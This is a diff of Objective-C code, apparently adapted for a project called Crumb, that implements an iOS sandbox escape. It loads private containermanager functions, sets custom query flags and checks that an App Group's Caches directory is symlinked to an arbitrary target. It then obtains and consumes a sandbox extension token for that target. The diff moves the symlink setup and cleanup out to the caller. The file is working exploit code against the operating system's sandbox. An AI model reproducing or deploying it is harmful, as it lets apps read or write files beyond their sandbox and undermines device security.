@@ -42,35 +42,14 @@ typedef char *(*container_copy_sandbox_token_fn)(void *);
 typedef int64_t (*sandbox_extension_consume_fn)(const char *);
 typedef int (*sandbox_extension_release_fn)(int64_t);
 
-// Remove symlink and recreate Caches directory
-static void clean_symlink(NSString *group) {
-    if (group != NULL) {
-        NSFileManager *files = [NSFileManager defaultManager];
-        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
-        if (groupRoot) {
-            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
-            [files removeItemAtURL: caches error: nil];
-            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
-        }
-    }
-    return;
-}
-
 // So, who's ready for round two?
-int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
-    // Check if the target exists
-    if (!create_dir) {
-        struct stat st;
-        if (lstat(target.fileSystemRepresentation, &st) != 0 && errno != EACCES && errno != EPERM) return -255; // Nothing exists at this path, and create_dir is false
-    }
-    
-    // Get the App Group's path
-    // An App Group identifier you control is required for this
+int64_t worse_query_prepared(NSString *target, NSString *group, NSString *caches, bool alt_flags) {
+    // Crumb adaptation: the caller owns a journalled, exclusive Caches lease.
+    // This function only queries/consumes the extension; it never removes data.
     NSFileManager *files = [NSFileManager defaultManager];
-    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
-    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
-    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
-    
+    NSString *link = [files destinationOfSymbolicLinkAtPath:caches error:nil];
+    if (![link isEqualToString:target]) return -4;
+
     // Resolve functions
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
     if (!mgr) return -2; // dlopen failed?
@@ -108,37 +87,25 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
         query_set_flags(query, 0x0000008000000000ULL);
     }
     
-    // Set up symlink
-    [files removeItemAtPath: caches error: nil];
-    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
-        query_free(query); // Crumb adaptation: do not leak on symlink failure.
-        dlclose(mgr);
-        clean_symlink(group);
-        return -4; // Failed to create symlink
-    }
-    
     // Send our query over
     void *result = query_get_single_result(query);
     if (!result) {
         query_free(query);
         dlclose(mgr);
-        clean_symlink(group);
         return -5; // Query rejected by containermanagerd
     }
     char *token = copy_sandbox_token(result);
     if (!token) {
         query_free(query);
         dlclose(mgr);
-        clean_symlink(group);
         return -6; // Kernel refused to issue a sandbox extension
     }
     
-    // Consume sandbox extension and clean up
+    // Consume sandbox extension. The caller restores the leased directory.
     int64_t handle = consume_extension(token);
     query_free(query);
     free(token);
     dlclose(mgr);
-    clean_symlink(group);
     
     return handle;
 }
